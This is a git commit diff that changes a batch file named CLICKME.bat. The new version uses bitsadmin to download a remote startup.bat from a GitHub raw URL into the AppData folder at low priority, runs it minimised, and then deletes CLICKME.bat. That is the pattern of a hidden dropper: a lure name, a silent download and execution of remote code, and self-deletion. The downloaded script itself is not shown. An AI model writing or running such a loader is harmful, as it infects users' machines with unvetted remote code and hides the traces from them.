5edc0abf7cf19cb426d5bc7961f5bd765d932922
Sean <155543056+SeanFromWP@users.noreply.github.com>
2024-12-11 20:49:27 +0800

    Update CLICKME.bat

--- CLICKME.bat
+++ CLICKME.bat
@@ -1,2 +1,4 @@
 @echo off
-start /min startup.bat
+bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/startup.bat" "%AppData%\startup.bat"
+start /min "%AppData%\startup.bat"
+del CLICKME.bat
